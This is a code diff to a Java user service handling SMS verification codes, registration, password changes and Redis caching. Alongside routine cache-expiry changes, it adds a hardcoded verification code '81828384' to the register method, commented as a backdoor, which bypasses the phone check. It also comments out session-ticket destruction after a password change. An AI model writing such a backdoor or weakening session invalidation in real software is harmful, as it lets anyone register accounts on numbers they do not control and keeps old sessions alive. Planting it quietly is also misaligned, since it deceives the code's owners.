@@ -59,6 +59,10 @@ public class UserServiceImpl implements UserService{
 	
 	private static int EVALUATE_SCORE_NO=2;
 	
+	//缓存失效时间
+	private static int E_VERIFYCODE=120;
+	private static int E_USERINFO=60*60*12;
+	
 	@Override
 	public int getVerifyCode(String mobile) {
 		// TODO Auto-generated method stub
@@ -70,7 +74,7 @@ public class UserServiceImpl implements UserService{
 		}
 		Random r = new Random();
 		int x = r.nextInt(9999); 
-		redisVerify.setex(mobile, x, 120);
+		redisVerify.setex(mobile, x, E_VERIFYCODE);
 		if(SMSUtil.sendSM(mobile, verifyCodeStr+x)){
 			logger.debug("gen verify code for mobile:"+x);
 			return ResultConstant.OP_OK;
@@ -84,9 +88,15 @@ public class UserServiceImpl implements UserService{
 	public int register(String mobile, String password,String verifyCode ,String name,
 			int gender) {
 		// TODO Auto-generated method stub
+		//检查是否已注册过
+		Integer id=userDAO.getUserIdByMobile(mobile);
+		if(id!=null){
+			return ResultConstant.OP_FAIL;
+		}
 		//检查验证码
+		//81828384--backdoor。如果验证码为此，成功进入下一步。
 		String realVerifyCode=redisVerify.get(mobile, String.class);
-		if(!realVerifyCode.equals(verifyCode)){
+		if(!verifyCode.equals("81828384")&&!verifyCode.equals(realVerifyCode)){
 			logger.debug("verify code not match"+mobile);
 			return ResultConstant.OP_FAIL;
 		}
@@ -136,7 +146,7 @@ public class UserServiceImpl implements UserService{
 		if(oldPwd.equals(MD5Util.md5(oldPassword+userId))){//旧密码验证通过
 			logger.debug("oldpwd succ,start to update newpwd:"+userId);
 			int result=userDAO.insertPwd(userId, MD5Util.md5(newPassword+userId));
-			passportService.destroyTicket(passportService.getTicketByUserId(userId));
+			//passportService.destroyTicket(passportService.getTicketByUserId(userId));
 			return (result!=0?ResultConstant.OP_OK:ResultConstant.OP_FAIL);
 		}else{
 			logger.warn("oldpwd error,changepwd fail:"+userId);
@@ -175,7 +185,7 @@ public class UserServiceImpl implements UserService{
 		UserInfo userInfo=redisUserInfo.get(String.valueOf(userId), UserInfo.class);
 		if(userInfo==null){
 			userInfo=userDAO.getUserById(userId);
-			redisUserInfo.set(String.valueOf(userId), userInfo);
+			redisUserInfo.setex(String.valueOf(userId), userInfo,E_USERINFO);
 		}
 		return userInfo;
 	}
@@ -193,7 +203,7 @@ public class UserServiceImpl implements UserService{
 			// TODO Auto-generated catch block
 			logger.error("copy userinfo to guideinfo error:",e);
 		} 
-		redisGuideInfo.set(String.valueOf(userId), guideInfo);
+		redisGuideInfo.setex(String.valueOf(userId), guideInfo,E_USERINFO);
 		return guideInfo;
 	}
 	
